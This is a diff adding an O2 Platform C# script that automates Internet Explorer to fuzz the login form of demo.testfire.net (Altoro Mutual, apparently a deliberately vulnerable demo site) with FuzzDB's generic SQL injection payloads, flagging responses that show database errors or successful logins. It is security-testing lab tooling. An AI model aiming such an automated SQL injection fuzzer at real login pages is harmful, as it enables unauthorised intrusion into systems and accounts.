@@ -1,0 +1,78 @@
+<?xml version="1.0"?>
+<H2>
+  <SourceCode>//var topPanel = panel.clear().add_Panel();
+var topPanel = "Altoro - SQLi using FuzzDB (with screenshots)".popupWindow(1000,600); 
+topPanel.insert_LogViewer();
+ 
+var actionPanel = topPanel.insert_Above(20); 
+var ie = topPanel.add_IE().silent(true); 
+var treeView = topPanel.insert_Left(300).add_TreeView();
+
+bool stopFuzz = false;
+
+treeView.afterSelect&lt;string&gt;(
+	(file)=&gt;{
+				ie.open_ASync(file); 
+			});
+
+Func&lt;string,string,bool&gt; login = 
+    (username, password)=&gt;{
+                var loginUrl = "http://demo.testfire.net/bank/login.aspx";
+                ie.open(loginUrl);
+                ie.field("uid").value(username);
+                ie.field("passw").value(password);
+                ie.button("Login").click();
+                return ie.url() != loginUrl;
+              };
+
+Action startFuzz =
+	()=&gt;{				
+			stopFuzz = false;
+			var fuzzDb = new API_FuzzDB();
+			foreach(var payload in fuzzDb.payloads_SQLi_Generic())
+			{				
+			    "sending payload payload: {0}".info(payload);
+			    var loginResult = login(payload, payload);   
+			    treeView.add_Node(payload, topPanel.screenshot().save())      
+			    	    .color(  (ie.IE.Html.contains("System.Data.OleDb") || loginResult)
+			    	    			? Color.DarkRed
+			    					: Color.DarkGreen);
+			    
+			    if (stopFuzz)
+				{
+					treeView.add_Node("Fuzz stop request received").color(Color.Red); 
+					break;
+				}    
+			}
+		};
+
+Action saveResults = 
+	()=&gt;{
+			var results = new Items();
+			foreach(var node in treeView.nodes())
+				results.add(node.get_Text(), node.get_Tag().str()); 
+			var savedResultsFile = results.save();
+			"results file saved to : {0}".info(savedResultsFile);
+			savedResultsFile.showInCodeViewer();
+		};
+
+actionPanel.add_Link("Start SQLi Fuzz", 4,0, ()=&gt; startFuzz())
+		   .append_Link("Stop Fuzz", ()=&gt; stopFuzz = true)
+		   .append_Link("Save results" , ()=&gt; saveResults());
+
+ie.open( "http://demo.testfire.net");
+		
+return "done";
+
+//O2File:WatiN_IE_ExtensionMethods.cs
+//O2File:API_FuzzDB.cs
+//O2File:API_Cropper.cs
+//using O2.XRules.Database.Utils.O2
+//O2Ref:WatiN.Core.1x.dll
+//O2Ref:Microsoft.mshtml.dll
+
+
+
+</SourceCode>
+  <ReferencedAssemblies />
+</H2>
